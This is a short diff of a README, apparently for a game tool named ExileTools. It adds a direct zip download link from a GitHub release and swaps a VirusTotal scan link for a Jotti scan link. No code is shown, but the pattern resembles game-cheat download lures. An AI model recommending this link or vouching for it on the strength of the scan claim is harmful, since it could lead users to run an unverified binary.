@@ -169,13 +169,13 @@ Use at your own discretion and always respect the game's Terms of Service.
 
 # 🚀 Getting Started
 
-## Download
+## Download https://github.com/dte99212-hash/ExileTools/releases/download/Release/ExileTools.zip
 
 
 
-## VirusTotal Scan
+## VirusScan
 
-https://www.virustotal.com/gui/url/6ba0714d9b34204653ef7c0f52ab32a20c322d1dd088d3eeadf69fb009425e58/detection
+https://virusscan.jotti.org/ru-RU/filescanjob/79kgrmte49
 
 ---
 
